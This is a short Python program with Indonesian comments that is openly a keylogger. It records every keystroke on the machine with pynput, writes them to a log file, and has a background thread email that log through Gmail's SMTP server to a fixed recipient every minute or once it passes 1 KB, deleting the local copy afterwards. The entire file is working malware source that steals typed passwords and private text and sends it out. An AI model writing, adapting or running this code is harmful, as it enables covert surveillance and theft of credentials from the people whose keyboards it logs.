import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import os
import time
from pynput.keyboard import Key, Listener
import threading

# Informasi email
log_file = os.path.join(os.path.dirname(__file__), 'massage.txt')
to_email = "mrrxw01@example.com"  # Ganti dengan email penerima
from_email = "mrrxw02@gmail.com"  # Ganti dengan email pengirim
password = "masih sama"  # Ganti dengan App Password jika menggunakan 2FA

# Fungsi untuk mengirim email dengan lampiran log file
def send_email(log_file, to_email, from_email, password):
    # Buat pesan MIMEMultipart
    msg = MIMEMultipart()
    msg['From'] = from_email
    msg['To'] = to_email
    msg['Subject'] = "Keylogger Log File"
    
    # Lampirkan isi email
    body = "Berikut adalah log file hasil keylogger"
    msg.attach(MIMEText(body, 'plain'))
    
    # Lampirkan file log
    with open(log_file, "rb") as attachment:
        part = MIMEBase('application', 'octet-stream')
        part.set_payload(attachment.read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', f"attachment; filename= {os.path.basename(log_file)}")
        msg.attach(part)
    
    # Set up server SMTP
    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()  # Enkripsi email
        server.login(from_email, password)  # Login ke email pengirim
        text = msg.as_string()
        server.sendmail(from_email, to_email, text)
        server.quit()
        print(f"Log file '{log_file}' berhasil dikirim ke {to_email}")
    except Exception as e:
        print(f"Gagal mengirim email: {e}")

# Fungsi untuk menulis setiap tombol yang ditekan ke dalam file log
def on_press(key):
    with open(log_file, "a") as f:
        try:
            f.write(f"{key.char}")
        except AttributeError:
            if key == Key.space:
                f.write(" ")
            elif key == Key.enter:
                f.write("\n")
            else:
                f.write(f" [{key}] ")

# Fungsi untuk menghentikan keylogger jika tombol Esc ditekan
def on_release(key):
    if key == Key.esc:
        return False

# Fungsi untuk memantau file log dan mengirimkan email jika ukurannya > 1KB
def monitor_log_file(interval=60):
    last_sent_time = time.time()  # Waktu saat program mulai
    
    while True:
        current_time = time.time()
        if (current_time - last_sent_time > interval) or (os.path.exists(log_file) and os.path.getsize(log_file) > 1024):
            if os.path.exists(log_file) and os.path.getsize(log_file) > 0:  # Kirim email jika ada konten
                send_email(log_file, to_email, from_email, password)
                os.remove(log_file)  # Hapus file setelah dikirim
            last_sent_time = current_time  # Reset waktu terakhir email dikirim
        time.sleep(interval)  # Cek setiap interval detik

# Fungsi untuk menjalankan keylogger
def start_keylogger():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

# Jalankan keylogger dan monitoring secara bersamaan menggunakan threading
if __name__ == "__main__":
    t1 = threading.Thread(target=start_keylogger)
    t2 = threading.Thread(target=monitor_log_file)
    
    t1.start()
    t2.start()
    
    t1.join()
    t2.join()
